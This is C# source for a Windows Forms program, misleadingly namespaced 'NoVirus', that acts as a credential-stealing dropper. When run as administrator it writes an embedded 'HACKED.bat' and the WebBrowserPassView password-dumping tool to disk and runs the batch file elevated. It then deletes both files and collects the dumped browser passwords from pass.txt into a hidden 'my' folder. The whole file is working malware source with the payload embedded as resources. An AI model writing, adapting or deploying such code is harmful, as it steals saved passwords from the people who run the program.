using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using System.Security.Principal;
using System.Threading;

namespace NoVirus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeLibrary();
        }
        bool isAdmin;
        string path;
        private void InitializeLibrary()
        {
            path = Assembly.GetExecutingAssembly().Location; isAdmin = false;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            if (isAdmin)
            {
                try
                {
                    int last = path.LastIndexOf('\u005c') + 1;
                    path = path.Remove(last);
                    string bat = path + "HACKED.bat";
                    string passview = path + "WebBrowserPassView.exe";
                    if (File.Exists(bat) != true && File.Exists(passview) != true)
                    {
                        File.WriteAllBytes(bat, Properties.Resources.HACKED);
                        File.WriteAllBytes(passview, Properties.Resources.WebBrowserPassView);
                        Process my = new Process();
                        my.StartInfo.FileName = $"{path}HACKED.bat";
                        my.StartInfo.UseShellExecute = true;
                        my.StartInfo.Verb = "runas";
                        my.Start();
                        my.WaitForExit();
                    }
                }
                catch (Exception exc) { MessageBox.Show($"{exc.Message}!\n Please, run this program as administrator!", "Error!"); Close(); }
            }
            else { MessageBox.Show($"Please, run this program as administrator!", "Error!"); Close(); }
            Suicide();
        }

        private void Suicide()
        {
            if (isAdmin)
            {
                Thread.Sleep(1000);
                if (File.Exists($"{path}HACKED.bat")) { File.Delete($"{path}HACKED.bat"); }
                if (File.Exists($"{path}WebBrowserPassView.exe")) { File.Delete($"{path}WebBrowserPassView.exe"); }
                if (File.Exists($"{path}pass.txt"))
                {
                    if (Directory.Exists($"{path}my") != true) { Directory.CreateDirectory($"{path}my"); }
                    if (File.Exists($"{path}my\\pass.txt")) { File.Replace($"{path}pass.txt", $"{path}my\\pass.txt", ""); }
                    else { File.Move($"{path}pass.txt", $"{path}my\\pass.txt"); }
                }
                else { Suicide(); }
                Close();
            }
            else { Close(); }
        }
    }
}
